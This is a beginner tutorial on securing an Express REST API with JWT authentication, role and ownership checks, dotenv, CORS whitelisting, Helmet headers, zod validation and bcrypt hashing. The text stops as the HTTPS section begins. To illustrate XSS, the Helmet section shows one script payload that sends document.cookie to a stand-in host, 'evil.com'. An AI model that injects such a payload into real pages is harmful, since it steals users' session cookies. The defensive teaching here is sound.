# API Security Fundamentals

Now that you can build and test a REST API with Express, it's time to think about **keeping it safe**. A backend that accepts requests and returns data can be **abused** if you don't put guardrails in place.

When you build a REST API, you're usually protecting at least one of these:

- **Who can access it** (only logged-in users, only admins, only your frontend)
- **What data can be seen** (don't leak all users)
- **What data can be changed** (only the owner can update their profile)
- **Secrets** (DB password, API keys, JWT secret)
- **Your server** (so it doesn't crash or get spammed)

So security is just: **"Only the right people can do the right things with the right data."**

## The Big Picture

Imagine you're building an API for a note-taking app. Users can sign up, log in, and manage their own notes. Here's what could go wrong without security:

- Anyone could read anyone else's notes
- Someone could spam your server with thousands of fake requests
- A hacker could steal your database password from your GitHub repo
- A malicious website could make requests to your API pretending to be your frontend

Security isn't one single thing — it's a set of layers that each block a different kind of problem. Here's how they stack:

```
                    INCOMING REQUEST
                          │
                          ▼
              ┌───────────────────────┐
              │  CORS                 │  ← Is this request coming from
              │                       │    an allowed frontend?
              └───────────┬───────────┘
                          │
                          ▼
              ┌───────────────────────┐
              │  Helmet               │  ← Are the response headers
              │                       │    set safely?
              └───────────┬───────────┘
                          │
                          ▼
              ┌───────────────────────┐
              │  Input Validation     │  ← Is the data being sent
              │                       │    valid and safe?
              └───────────┬───────────┘
                          │
                          ▼
              ┌───────────────────────┐
              │  Authentication       │  ← Is this a real, logged-in
              │  (JWT)                │    user?
              └───────────┬───────────┘
                          │
                          ▼
              ┌───────────────────────┐
              │  Authorization        │  ← Does this user have
              │                       │    permission for this action?
              └───────────┬───────────┘
                          │
                          ▼
                    YOUR ROUTE LOGIC
```

Each layer in this doc maps to one of those boxes. By the end, you'll know how to implement all of them.

---

## What Is "Logging In"? What Is a Token?

Before diving into any code, it's worth explaining some terms that get used constantly in this doc — but are actually new concepts for most beginners.

### What Does "Logging In" Actually Mean?

When a user logs in to your app, they're really asking the server one question:

> "I'm claiming to be this person. Can you verify that and let me in?"

The user sends their email and password. Your server checks those credentials — if they match what's stored, the server confirms the user's identity and lets them through.

But here's the problem: **HTTP has no memory.**

Every request your server receives is completely independent. The server has no idea if the person making a request 5 seconds ago is the same person making one now. It can't remember who is logged in.

So how does a server know who you are on request number 2, 3, or 100?

This is a problem every web developer has had to solve. Let's look at the three approaches — from the naive first attempt, to the traditional solution, to the modern approach used in REST APIs today.

---

### Approach 1 — Send the Password Every Time (Don't Do This)

The most obvious beginner idea: just send the email and password with every request.

```
GET /api/notes
email: user@example.com
password: mypassword123
```

This seems simple, but it's a serious security problem:

| Problem | Why It Matters |
|---------|---------------|
| Password exposed on every request | Every request is a new opportunity for it to be intercepted |
| Password must be stored somewhere on the client | Hard to store safely in a browser |
| Server hits the database on every request to verify | Slow and expensive at scale |
| If any one request is compromised | The attacker now has the actual password permanently |

This approach is never used in real apps. It's mentioned here so you understand *why* something better was needed.

---

### Approach 2 — Sessions (The Traditional Solution)

Before tokens, most web apps used **sessions**. Here's how it works:

```
  1. User logs in:
  ┌────────────┐   email + password    ┌────────────┐
  │  Browser   │ ────────────────────▶ │   Server   │
  │            │ ◀──────────────────── │            │
  └────────────┘  Set-Cookie: sid=abc  └────────────┘
                                        stores { abc: userId=42 }
                                        in server memory

  2. Every request after that:
  ┌────────────┐   Cookie: sid=abc     ┌────────────┐
  │  Browser   │ ────────────────────▶ │   Server   │
  │            │                       │ looks up   │
  │            │ ◀──────────────────── │ abc in     │
  └────────────┘   here's your data    │ memory     │
                                       └────────────┘
```

The server gives the browser a **session ID** (a random string) stored in a cookie. On every request, the browser sends that cookie automatically, and the server looks up the session ID in its memory to find out who you are.

This works — and it's still used in many traditional web apps today. But it has real limitations:

| Problem | Why It Matters |
|---------|---------------|
| Session data lives in server memory | If the server restarts, everyone gets logged out |
| Hard to scale across multiple servers | Server B doesn't know about sessions created on Server A |
| Cookies don't work well for mobile apps | Native iOS/Android apps don't have a browser cookie jar |
| Every request requires a memory or DB lookup | Adds overhead on every single request |

This is exactly the problem that **tokens** were designed to solve.

---

### Approach 3 — Tokens (The Modern Solution)

Instead of the server storing who is logged in, what if the proof of identity lived with the **client**?

That's what a token does. After login, the server creates a small package of data — containing the user's ID, role, and an expiry time — **signs** it with a secret key, and sends it to the client. The client stores it and sends it back with every future request.

```
  1. User logs in:
  ┌────────────┐   email + password      ┌────────────┐
  │  Frontend  │ ──────────────────────▶ │   Server   │
  │            │                         │            │
  │            │ ◀────────────────────── │ creates +  │
  └────────────┘   here's your token     │ signs token│
        │                                └────────────┘
  stores token
  (localStorage)

  2. Every request after that:
  ┌────────────┐  Authorization:          ┌────────────┐
  │  Frontend  │  Bearer eyJ...           │   Server   │
  │            │ ──────────────────────▶  │            │
  │            │                          │ verifies   │
  │            │ ◀────────────────────── │ signature  │
  └────────────┘   here's your data       └────────────┘
                                        (no DB lookup needed)
```

### How Does "Signing" Work?

When the server creates a token it doesn't just package up your user ID and send it — anyone could fake that. Instead it runs the token data through a mathematical formula using a **secret key** that only your server knows. The result is a unique signature appended to the token.

When the server receives a token on a future request, it runs the same formula again. If the signature matches, the token is genuine and hasn't been tampered with. If someone changed even one character of the token, the signature won't match and the server rejects it.

```
  Creating a token:
  { id: 42, role: "user" } + SECRET_KEY  ──▶  eyJhbGci...Xk8fw8

  Verifying a token:
  eyJhbGci...Xk8fw8 + SECRET_KEY  ──▶  ✅ valid  (signatures match)
                                        ❌ invalid (token was tampered with)
```

This means the token is safe to store on the client — even if someone reads it, they can't modify it without invalidating the signature. And they can't create a fake token without knowing your secret key.

### Why Tokens Solve What Sessions Couldn't

| Benefit | How Tokens Achieve It |
|---------|----------------------|
| **No server-side storage needed** | Identity lives in the token itself |
| **Works across multiple servers** | Any server with the secret key can verify the token |
| **Works with mobile apps** | Sent as a header, not a cookie — works anywhere |
| **No DB lookup on every request** | Verification is just a math check, not a database query |
| **Scales easily** | Stateless by design — add more servers without coordination |

---

### Sessions vs Tokens — Which Should You Use?

Tokens are not the only right answer. Sessions are still widely used in production today — they just solve different problems. Here's an honest comparison:

| | Sessions | Tokens (JWT) |
|---|---|---|
| **Where identity is stored** | Server memory or database | Inside the token itself (client-side) |
| **How the client proves identity** | Cookie with a session ID | Authorization header with the token |
| **Server needs DB on every request?** | Yes — to look up the session | No — just verifies the signature |
| **Instant logout possible?** | ✅ Yes — delete the session | ❌ Hard — token stays valid until it expires |
| **Works across multiple servers?** | ❌ Harder — servers must share session storage | ✅ Yes — any server can verify the token |
| **Works with mobile apps?** | ❌ Cookies are browser-only | ✅ Yes — just send the token in a header |
| **Easy to scale?** | ❌ Harder at scale | ✅ Yes — stateless by design |
| **Fine-grained session control?** | ✅ Yes — revoke any session instantly | ❌ Limited without extra infrastructure |

**When sessions are still the right choice:**
- Traditional server-rendered web apps (Rails, Django, Laravel, PHP) — these use sessions by default and there's no reason to change
- Banking, healthcare, or high-security apps where you need to instantly revoke access (e.g. suspicious activity detected, user gets banned)
- Apps that need to track active users server-side, or where compliance requires it
- Simple web apps where scaling isn't a concern and you want the simplicity of cookies

**When tokens are the better choice:**
- REST APIs consumed by a React, Vue, or mobile frontend — the pattern this course focuses on
- Apps that need to scale across multiple servers without shared session storage
- Microservices where many different services need to verify the same user's identity
- APIs consumed by third parties or mobile apps where cookies aren't practical

**The honest answer:** neither is universally better. In the Node/Express/React world you're learning, **tokens are the standard** and what you'll encounter most. But if you ever work on a Django, Rails, or PHP codebase — or build something that needs strict instant logout — sessions are absolutely still the right tool.

> This doc focuses on JWT tokens because they're the right fit for REST APIs. But now you know sessions exist, what they do differently, and when you'd reach for one over the other.

---

### What Is a Token?

A **token** is a piece of data that proves you've already been verified.

Think of it like a wristband at a concert:
- You show your ID once at the entrance (login with email + password)
- You get a wristband (the token)
- For the rest of the night, staff just check your wristband — they don't ask for your ID again

```
  First request (login):
  ┌────────────┐   email + password    ┌────────────┐
  │  Frontend  │ ────────────────────▶ │   Server   │
  │            │ ◀──────────────────── │            │
  └────────────┘   here's your token   └────────────┘

  Every request after that:
  ┌────────────┐   token in header     ┌────────────┐
  │  Frontend  │ ────────────────────▶ │   Server   │
  │            │ ◀──────────────────── │            │
  └────────────┘   here's your data    └────────────┘
```

The token is:
- Issued by the server after a successful login
- Stored by the frontend (in memory or localStorage)
- Sent with every future request in a header
- Verified by the server on every protected route

The frontend never sends a password again after login — just the token.

---

### What's Actually Inside a Token?

A token isn't magic — it's just a string of encoded data. Here's what it contains:

| Part | Contains | Example Value |
|------|----------|---------------|
| **Who** | The user's ID | `id: 42` |
| **Role** | What type of user they are | `role: "admin"` |
| **Expiry** | When the token stops working | `exp: 1725065402` (a Unix timestamp) |
| **Issued at** | When it was created | `iat: 1725061802` |

The server uses this information so it doesn't need to look up the user in the database on every single request. The user's identity is already baked into the token.

> **Important:** The token is encoded, not encrypted. Anyone can decode it and read what's inside — so never put sensitive data like passwords inside a token. The security comes from the **signature**, which proves the token was created by your server and hasn't been tampered with.

---

### What Is "Bearer" in the Authorization Header?

When the frontend sends a token, it looks like this:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The word **Bearer** is just a standard label that means "the person sending this request is the bearer (carrier) of this token." It's part of the HTTP authentication standard — you'll see it in virtually every token-based API in the wild. Your server reads the header, strips off the word "Bearer", and is left with just the token string to verify.

---

### What Happens When a Token Expires?

Every token has an expiry time — in the examples in this doc, tokens expire after 1 hour (`expiresIn: "1h"`).

After that:
- The server will reject the token with a `401 Unauthorized` response
- The user will need to log in again to get a new token
- The frontend should detect the 401 and redirect the user to the login page

```
  Token expires after 1 hour:

  ┌────────────┐   expired token       ┌────────────┐
  │  Frontend  │ ────────────────────▶ │   Server   │
  │            │ ◀──────────────────── │            │
  └────────────┘   401 Unauthorized    └────────────┘
        │
  Redirect to login page
        │
  User logs in again → gets a fresh token
```

This is intentional — short-lived tokens limit the damage if a token is ever stolen. A stolen token that expires in an hour is much less dangerous than one that lasts forever.

---

### What About Logging Out?

With traditional session-based login, the server stores who is logged in. Logging out means the server deletes the session.

With JWT tokens, **the server stores nothing** — there's no session to delete. So "logging out" on the client side just means deleting the token from wherever it was stored:

```js
// Logging out — just remove the token from storage
localStorage.removeItem("token");

// Then redirect the user to the login page
window.location.href = "/login";
```

Once the token is gone from the frontend, the user can't make authenticated requests anymore. The token itself is still technically valid until it expires — but since the frontend no longer has it, it can't be used.

> **Advanced note:** If you need to truly invalidate a token before it expires (e.g. a user gets banned), you need a server-side blocklist. That's an advanced topic — for now, short expiry times + client-side deletion is the standard approach.

---

### Where Should the Frontend Store the Token?

This is a common question — here are the two main options and their tradeoffs:

| Storage | How | Pros | Cons |
|---------|-----|------|------|
| **localStorage** | `localStorage.setItem("token", token)` | Simple, persists across page refreshes | Vulnerable to XSS attacks — malicious scripts can read it |
| **Memory (JS variable)** | `let token = data.token` | More secure — scripts can't access it | Lost on page refresh — user has to log in again |

For learning and building projects, **localStorage is fine**. In production apps handling sensitive data, memory storage or HTTP-only cookies are preferred — but those are more advanced patterns you'll encounter later.

---

## Authentication vs Authorization

Now that you know what a token is, let's look at the two security concepts that tokens power: authentication and authorization.

They sound similar, but they do **different jobs** — and you need both to keep your API safe.

| | Authentication | Authorization |
|---|---|---|
| **Question** | Who are you? | What are you allowed to do? |
| **When** | On every request | After authentication passes |
| **How** | Verify a JWT token | Check user role or ownership |
| **Fails with** | `401 Unauthorized` | `403 Forbidden` |
| **Example** | Is this a real logged-in user? | Can this user delete this note? |

Think of your API as a concert venue:
- **Authentication** is showing your ticket at the gate — proving you're allowed in at all.
- **Authorization** is whether that ticket lets you into the VIP lounge — what you can do once you're in.

Both checks happen on every protected request, in that order.

---

### The Three Flows You Need to Understand

Most beginner APIs need three things to work securely: **registration**, **login**, and **protected requests**. Here's how they all fit together from the frontend to the backend.

#### Flow 1 — Registration (Creating an Account)

```
FRONTEND                          BACKEND
--------                          -------

User fills in signup form
  { email, password }
        │
        │  POST /api/register
        │─────────────────────────────▶
                                  Validate input
                                        │
                                  Hash password with bcrypt
                                        │
                                  Save user to DB
                                        │
                                  ◀─────────────────────────────
                            201 Created { message: "Account created" }
```

#### Flow 2 — Login (Getting a Token)

```
FRONTEND                          BACKEND
--------                          -------

User fills in login form
  { email, password }
        │
        │  POST /api/login
        │─────────────────────────────▶
                                  Look up user by email
                                        │
                                  bcrypt.compare(password, hash)
                                        │
                                  ┌─────┴──────┐
                               no match      match
                                  │             │
                             401 Error     jwt.sign({ id, role })
                                                │
                                  ◀─────────────────────────────
                                    200 OK { token: "eyJ..." }
        │
  Store token
  (memory or localStorage)
```

#### Flow 3 — Protected Request (Using the Token)

```
FRONTEND                          BACKEND
--------                          -------

User clicks "My Notes"
        │
        │  GET /api/notes
        │  Authorization: Bearer eyJ...
        │─────────────────────────────▶
                                  auth middleware runs
                                        │
                                  jwt.verify(token)
                                        │
                                  ┌─────┴──────┐
                               invalid       valid
                                  │             │
                             401 Error     req.user = { id, role }
                                                │
                                          Route logic runs
                                                │
                                  ◀─────────────────────────────
                                    200 OK { notes: [...] }
```

---

### What This Looks Like in Code

#### Step 1 — Registration Route

```js
import bcrypt from "bcrypt";

app.post("/api/register", async (req, res) => {
  const { email, password } = req.body;

  // 1. Basic validation
  if (!email || !password) {
    return res.status(400).json({ message: "Email and password required" });
  }

  // 2. Hash the password before storing it
  const hashedPassword = await bcrypt.hash(password, 10);

  // 3. Save the user (placeholder — real DB query comes in the databases doc)
  const user = saveUser({ email, hashedPassword });

  res.status(201).json({ message: "Account created" });
});
```

#### Step 2 — Login Route

```js
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  // 1. Find the user (placeholder)
  const user = getUserByEmail(email);
  if (!user) return res.status(401).json({ message: "Invalid credentials" });

  // 2. Check password against stored hash
  const isMatch = await bcrypt.compare(password, user.hashedPassword);
  if (!isMatch) return res.status(401).json({ message: "Invalid credentials" });

  // 3. Issue a JWT
  const token = jwt.sign(
    { id: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: "1h" }
  );

  res.json({ token });
});
```

#### Step 3 — Auth Middleware (Verify the Token)

This runs before any protected route. It checks the token is valid and attaches the user to the request:

```js
function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization; // "Bearer eyJ..."

  if (!authHeader) {
    return res.status(401).json({ message: "No token provided" });
  }

  const token = authHeader.split(" ")[1];

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded; // { id, role } now available in the route
    next();
  } catch (err) {
    return res.status(401).json({ message: "Invalid or expired token" });
  }
}
```

#### Step 4 — Authorization: Role Check

Once you know *who* the user is, you can check *what* they're allowed to do.  
This example restricts a route to admins only:

```js
function requireAdmin(req, res, next) {
  if (req.user.role !== "admin") {
    return res.status(403).json({ message: "Admins only" });
  }
  next();
}

// Only admins can see all users
app.get("/api/users", requireAuth, requireAdmin, (req, res) => {
  res.json({ users: getAllUsers() });
});
```

#### Step 5 — Authorization: Ownership Check

Role checks aren't the only kind of authorization. Often you need to check whether the logged-in user *owns* the resource they're trying to change:

```js
app.delete("/api/notes/:id", requireAuth, async (req, res) => {
  const note = getNoteById(req.params.id); // placeholder

  if (!note) {
    return res.status(404).json({ message: "Note not found" });
  }

  // Check the note belongs to the logged-in user
  if (note.userId !== req.user.id) {
    return res.status(403).json({ message: "You can only delete your own notes" });
  }

  deleteNote(req.params.id);
  res.json({ message: "Note deleted" });
});
```

Without this check, any logged-in user could delete anyone else's notes — even if they're not an admin.

---

### Frontend Code: How to Send the Token

After login, the frontend stores the token and includes it in every request that needs authentication:

```js
// After login — store the token
const response = await fetch("/api/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email, password }),
});
const { token } = await response.json();
localStorage.setItem("token", token); // store it

// On a protected request — send the token in the header
const notes = await fetch("/api/notes", {
  headers: {
    Authorization: `Bearer ${localStorage.getItem("token")}`,
  },
});
```

> **Note:** Storing tokens in `localStorage` is simple but has security tradeoffs. For now it's fine — more advanced token storage strategies are a later topic.

---

### Summary

| Step | Route | Who Does It | What Happens |
|------|-------|-------------|--------------|
| Register | `POST /api/register` | New user | Password hashed, user saved |
| Login | `POST /api/login` | Returning user | Password checked, JWT issued |
| Protected request | Any private route | Logged-in user | Token verified, `req.user` set |
| Role check | Admin routes | Admin user | `req.user.role` checked |
| Ownership check | Resource routes | Any user | `req.user.id` vs resource owner |

## Hide Your Secrets with Environment Variables

When you start building real APIs, you'll often need to store **sensitive information** — database passwords, API keys, JWT secrets, and more.  
These values should **never** be hardcoded directly into your source code.

### 🚫 Never Hardcode Secrets

```js
// ❌ don't do this
const dbPassword = "supersecret";
const jwtSecret = "myJWTpassword123";
```

Why is this bad?

- If you upload this to GitHub, everyone can see your password.  
- If someone gains access to your code, they can access your database or issue fake login tokens.  
- Changing environments (local → production) becomes messy — you'd have to edit code every time.

### ✅ Use Environment Variables Instead

Environment variables are **private configuration values** that live **outside your codebase**.  
They're stored in a `.env` file (not pushed to GitHub) and loaded into your app at runtime.

### 1. Install the dotenv package
```bash
npm install dotenv
```

### 2. Create a `.env` file
```bash
DB_PASSWORD=supersecret
JWT_SECRET=topsecretkey
```

### 3. Load the values in your app
```js
// server.js
import "dotenv/config";

const dbPassword = process.env.DB_PASSWORD;
const jwtSecret = process.env.JWT_SECRET;
```

Now your code is clean, safe, and easy to configure between environments.

---

### 💡 Why This Matters for Security

Environment variables protect the **core secrets** that power your authentication and authorization systems.

| Secret Type | Used For | Why It's Sensitive |
|--------------|-----------|-------------------|
| **JWT Secret** | Used to sign and verify login tokens | Anyone with it can fake being any user |
| **DB Password** | Connects to your database | Gives full access to all user data |
| **API Keys** | Access third-party services (like Stripe, AWS, or Google) | Could lead to billing or data leaks |

If someone steals these, they can:
- Log in as any user (bypass authentication)
- Escalate permissions (bypass authorization)
- Access your entire database (bypass everything)

### Real-World Deployment

Platforms like **Render**, **Railway**, **Vercel**, or **AWS** automatically let you set environment variables through their dashboards.  
This means you never have to store passwords or secrets in your public code repository.

In short:  
> **If your secrets aren't protected, neither are your users.**

## Using JWT for Auth

Now that you understand what tokens are and how login works conceptually, let's look at how JWT specifically implements all of this.

**JWT** stands for **JSON Web Token**. It's the most widely used token format for REST APIs — you'll see it in almost every modern backend.

Once a user logs in successfully, your API gives them a JWT.  
On every future request, they send that token instead of their password — keeping authentication **stateless** and secure.

**Stateless** means your server doesn't need to remember who is logged in. The token itself carries that information, and your server just verifies it on each request — no database lookup needed.

> You've already seen the full login and registration flows in the Authentication vs Authorization section above. This section covers how JWT tokens work under the hood.

### Why Use Tokens Over Sessions?

Traditional login systems store user sessions on the server — every logged-in user takes up server memory, and every request requires a database lookup to check if the session is valid.

With **JWT**, the session data lives inside the token itself, signed and verified by your server secret. No server-side storage needed.

| | Sessions | JWT Tokens |
|---|---|---|
| **Stored on** | Server (in memory or DB) | Client (localStorage or memory) |
| **Server needs DB on each request?** | Yes | No |
| **Easy to invalidate?** | Yes (delete session) | Harder (wait for expiry) |
| **Scales easily?** | Harder | Yes |
| **Best for** | Traditional web apps | REST APIs, mobile apps |

```bash
npm install jsonwebtoken
```

### Creating a Token After Login

```js
import jwt from "jsonwebtoken";

// Called after credentials have been verified
const token = jwt.sign(
  { id: user.id, role: user.role }, // data to encode in the token
  process.env.JWT_SECRET,           // secret key from your .env
  { expiresIn: "1h" }               // token expires after 1 hour
);

res.json({ token });
```

The token contains encoded (not encrypted) data — anyone can decode it and read the payload, but only your server can **verify** it using your secret key. This means:

- ✅ Safe to store the user's ID and role in the token
- ❌ Never store passwords, card numbers, or sensitive data in the token

### Structure of a JWT

A JWT has three parts, separated by dots:

```
header.payload.signature
```

Example:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJpZCI6MSwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjUwNjE4MDIsImV4cCI6MTcyNTA2NTQwMn0
.Li6MEeqxuzx7v8GxvpoB4Yw4EeCZ_2lnZcOMxkU8fw8
```

| Part | What It Contains | Can It Be Read? |
|------|-----------------|-----------------|
| **Header** | Algorithm used to sign the token (e.g. HS256) | Yes — it's just base64 encoded |
| **Payload** | Your data: user id, role, expiry time | Yes — it's just base64 encoded |
| **Signature** | A hash of header + payload + your secret | Only verifiable with the secret |

The signature is what makes JWT secure. Without your secret key, no one can forge a valid token — even if they can read the payload.

### Protecting Routes with Middleware

```js
function auth(req, res, next) {
  const authHeader = req.headers.authorization; // "Bearer <token>"
  if (!authHeader) return res.status(401).json({ message: "No token" });

  const token = authHeader.split(" ")[1]; // strip "Bearer " prefix

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded; // { id, role }
    next();
  } catch (err) {
    return res.status(401).json({ message: "Invalid token" });
  }
}

app.get("/api/profile", auth, (req, res) => {
  res.json({ message: "Private profile", user: req.user });
});
```

If the token is valid, `req.user` is available for that route.  
If it's missing or invalid, the user gets a `401 Unauthorized` response.

## CORS — Configuring It Securely

You've already used CORS to get your frontend and backend talking. Now let's make sure it's configured securely for production — because the default setup leaves your API wide open.

Using `app.use(cors())` with no configuration allows **any website** to make requests to your API, including malicious ones. Instead, whitelist only the origins you trust:

```js
import cors from "cors";
import express from "express";

const app = express();

const allowedOrigins = ["http://localhost:5173", "https://myapp.com"];

app.use(cors({
  origin: function (origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true, // if you're using cookies or auth headers
}));
```

### Why this is better
- It **whitelists** multiple safe origins.  
- It rejects unknown origins instead of allowing everything.  
- `credentials: true` lets your frontend send cookies or tokens securely.

### 🚫 Common Mistakes

| Mistake | Why It's Risky |
|----------|----------------|
| Using `app.use(cors())` with no config | Allows **any website** to call your API — even malicious ones |
| Forgetting `credentials: true` | Breaks cookie-based logins |
| Using `"*"` with credentials | Not allowed by browsers — and unsafe |
| Allowing all origins in production | Exposes your API to public abuse |

## Helmet — Easy Security Headers

When you deploy an Express API, you're not just exposing your routes — you're exposing **HTTP responses** to the entire internet.  
Attackers often look for small misconfigurations (like missing headers) that reveal information about your server or weaken the browser's defenses.

That's where **Helmet** comes in. It automatically sets **security-related HTTP headers** that help protect both your API and the users who connect to it.

```bash
npm install helmet
```

In your main server file (e.g. `server.js` or `app.js`):

```js
import helmet from "helmet";
import express from "express";

const app = express();

app.use(helmet());
```

And that's it — one line of middleware gives you a strong baseline of protection.

### What Attacks Does Helmet Protect Against?

Before looking at the headers, it helps to understand the attacks they're defending against. These are real, common attacks that browsers are vulnerable to without the right headers in place.

**XSS (Cross-Site Scripting)**

XSS happens when an attacker manages to inject malicious JavaScript into your page — usually through user input that gets stored and displayed without being sanitised. When another user views that page, the malicious script runs in their browser.

```
  Without protection:
  Attacker submits: <script>fetch('evil.com?cookie='+document.cookie)</script>
  Your app stores it and displays it to other users
  Their browser runs the script → attacker steals their session cookie
```

**Clickjacking**

Clickjacking is when an attacker embeds your app inside an invisible iframe on their own site. They position it so that when a user thinks they're clicking a harmless button on the attacker's page, they're actually clicking something on your app — like "confirm transfer" or "delete account."

```
  Attacker's page:
  ┌─────────────────────────────┐
  │  "Click here to win a prize"│
  │  [WIN NOW]                  │  ← user thinks they're clicking this
  └─────────────────────────────┘
       ↕ invisible iframe underneath
  ┌─────────────────────────────┐
  │  Your bank app              │
  │  [Confirm Transfer £500]    │  ← they're actually clicking this
  └─────────────────────────────┘
```

**MIME Sniffing**

Browsers try to be helpful by guessing what type of file they're looking at, even if the server says otherwise. An attacker can exploit this by uploading a file that looks like an image but contains JavaScript — and the browser might execute it.

**What Helmet Sets For You**

| Header | Attack It Prevents | What It Does |
|--------|--------------------|-------------|
| `X-Frame-Options` | Clickjacking | Prevents your app being embedded in an iframe on another site |
| `X-Content-Type-Options` | MIME sniffing | Forces the browser to trust the content type the server declares |
| `Strict-Transport-Security` | Downgrade attacks | Forces browsers to use HTTPS, even if someone types `http://` |
| `X-XSS-Protection` | XSS | Enables the browser's built-in XSS filter as a backup layer |
| `Content-Security-Policy` | XSS, data injection | Restricts which scripts, styles, and resources can load on your page |

> **Note:** Helmet sets sensible defaults for all of these automatically. As your app grows, you may want to customise some of them — particularly `Content-Security-Policy` — but the defaults are a solid starting point.

## Validating Input (Don't Trust the Client)

Anything sent from the browser can be **wrong, missing, or malicious**.  
Just because the frontend says it's sending clean data doesn't mean you should trust it.

This is one of the **core rules** of backend development:
> ✅ Always validate and sanitize every piece of input your server receives.

Without validation, attackers can:
- Send malformed JSON that crashes your server.  
- Insert HTML or JavaScript into your database (XSS risk).  
- Change IDs or roles in requests to access other users' data.  
- Bypass frontend checks (since the frontend can be modified or faked).  

Every single API route that accepts user input — body, params, or query — should be validated.

### Simple Manual Validation Example

Even without libraries, you can add a basic safety check:

```js
app.post("/api/users", (req, res) => {
  const { name, email } = req.body;

  // Basic validation
  if (!name || !email) {
    return res.status(400).json({ message: "name and email required" });
  }

  // Continue creating the user safely
  res.status(201).json({ message: "User created!" });
});
```

This prevents the most common crash: missing or invalid data.

Example of a malicious request:

```json
{
  "email": "<script>alert('Hacked!')</script>"
}
```
If you don't validate or sanitize this, it could end up being stored and re-rendered on a page — leading to an **XSS attack**.

### What to Validate

| Area | Example | Why |
|------|----------|-----|
| **req.body** | Form or JSON payloads (e.g., `/register`) | Prevent invalid or unsafe data being stored |
| **req.params** | URL values like `/users/:id` | Stop attackers from passing unexpected values |
| **req.query** | Optional filters like `/users?role=admin` | Control accepted filters and types |

You can even enforce types and rules — e.g., `email` must look like an email, `age` must be a number, etc.

### Validation Libraries for Express

For larger apps, manual validation gets repetitive. A validation library lets you define reusable rules for each route.

The recommended starting point is **zod** — it's lightweight, readable, and widely used in modern Node projects. You'll likely encounter it in the wild.

```bash
npm install zod
```

```js
import { z } from "zod";

const userSchema = z.object({
  name: z.string().min(1),
  email: z.string().email(),
});

app.post("/api/users", (req, res) => {
  const result = userSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.errors });
  }
  // Safe to use result.data
});
```

> Other popular options include **express-validator** (declarative chain syntax) and **joi** (classic, config-heavy). They all solve the same problem — zod is just the cleanest starting point.

### Summary

- Never trust client input — browsers, Postman, and scripts can all send bad data.  
- Always validate `req.body`, `req.params`, and sometimes `req.query`.  
- Use **zod** (or a similar library) for cleaner, reusable rules.  
- Validation makes your API safer, more reliable, and easier to debug.

## Passwords: Hash, Don't Store

If your API has users and logins, **never store plain text passwords** — not even temporarily.  
If someone gains access to your database, unencrypted passwords expose **every user** immediately.

Hashing is a one-way transformation that turns a password into a scrambled string.  
Even the server cannot turn the hash back into the original password.

```bash
npm install bcrypt
```

### 🧮 Hashing Passwords

```js
import bcrypt from "bcrypt";

const plain = "mypassword";
const hashed = await bcrypt.hash(plain, 10); // 10 = salt rounds

// Store `hashed` in the database, not `plain`
```
Here's what happens behind the scenes:
1. bcrypt generates a random **salt** (unique per password).  
2. It mixes the salt + password and runs the hash algorithm multiple times.  
3. The final hash is stored — it's unique and irreversible.

Even if two users have the same password, their hashes will look different.

### 🔑 Verifying Passwords at Login

```js
const isMatch = await bcrypt.compare(plain, hashedFromDb);
if (!isMatch) {
  return res.status(401).json({ message: "Bad credentials" });
}
```
bcrypt handles the comparison internally — you never decrypt or reveal the password.

### Why Hashing Matters

| Threat | What Happens Without Hashing | How Hashing Helps |
|---------|------------------------------|-------------------|
| **Database Leak** | Attackers see every user's raw password | They see only hashes (useless without brute-force) |
| **Password Reuse** | Users often reuse passwords on other sites | Hashing prevents attackers from knowing the actual password |
| **Internal Access** | Developers or admins could view sensitive data | Hashed passwords are unreadable by humans |

Hashing = protecting users even when the database is compromised.

## Error Handling and Not Leaking Info

When something goes wrong, don't send the full error to the client — it might expose internal details like stack traces, file paths, or database info.

Bad:

```js
res.status(500).json(err);
```

Better:

```js
logger.error(err);
res.status(500).json({ message: "Something went wrong" });
```

You can even create an error-handling middleware:

```js
app.use((err, req, res, next) => {
  logger.error(err.stack);
  res.status(500).json({ message: "Server error" });
});
```

Note the use of `logger.error()` here — as covered in the logging doc, use your Winston logger instead of `console.error` so errors are captured consistently in your logs.

## Putting It All Together

Here's a minimal Express server with all the security layers applied. Read through the comments — each line maps to a concept from this doc.

```js
import express from "express";
import "dotenv/config";       // loads .env into process.env
import cors from "cors";
import helmet from "helmet";
import jwt from "jsonwebtoken";

const app = express();
const FRONTEND_ORIGIN = process.env.FRONTEND_ORIGIN || "http://localhost:5173";
const JWT_SECRET = process.env.JWT_SECRET || "change_this_in_prod";

// 1. Parse incoming JSON bodies
app.use(express.json());

// 2. Only allow requests from your frontend origin
app.use(cors({ origin: FRONTEND_ORIGIN }));

// 3. Set secure HTTP headers automatically
app.use(helmet());

// 4. Auth middleware — verifies the JWT on protected routes
function auth(req, res, next) {
  const header = req.headers.authorization; // expects "Bearer <token>"
  if (!header) return res.status(401).json({ message: "No token" });

  const token = header.split(" ")[1];
  try {
    req.user = jwt.verify(token, JWT_SECRET); // { id, role, ... }
    next();
  } catch {
    return res.status(401).json({ message: "Invalid token" });
  }
}

// 5. Public route — no auth needed
app.get("/health", (req, res) => res.json({ status: "ok" }));

// 6. Private route — auth middleware runs first
app.get("/private", auth, (req, res) =>
  res.json({ message: "Private data", user: req.user })
);

// 7. Global error handler — must come last
app.use((err, req, res, next) => {
  logger.error(err);
  res.status(500).json({ message: "Server error" });
});

app.listen(3000, () => console.log("API running on http://localhost:3000"));
```

## HTTPS — Encrypting Data in Transit

All of the security measures in this doc protect your data at rest and your server logic — but there's one more layer that protects data **while it's travelling** between the client and your server: **HTTPS**.

### What Is HTTPS?

HTTP sends data as plain text. That means if someone is watching network traffic between a user and your server — on a coffee shop Wi-Fi, for example — they can read everything:

```
  HTTP (unencrypted):
